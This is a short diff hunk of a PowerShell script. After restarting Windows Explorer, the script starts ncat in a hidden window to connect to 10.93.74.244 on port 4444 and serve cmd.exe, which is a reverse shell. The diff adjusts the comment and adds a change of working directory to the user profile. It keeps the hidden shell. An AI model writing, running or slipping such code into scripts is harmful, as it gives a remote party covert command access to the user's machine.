@@ -69,6 +69,8 @@ Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer
 Stop-Process -Name explorer -Force
 Start-Process explorer.exe
 
-# Reverse shell
+#Reverse Shell
+Set-Location $env:USERPROFILE
 $Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
 Start-Process -FilePath $Ncat -ArgumentList "10.93.74.244 4444 -e cmd.exe" -WindowStyle Hidden
+
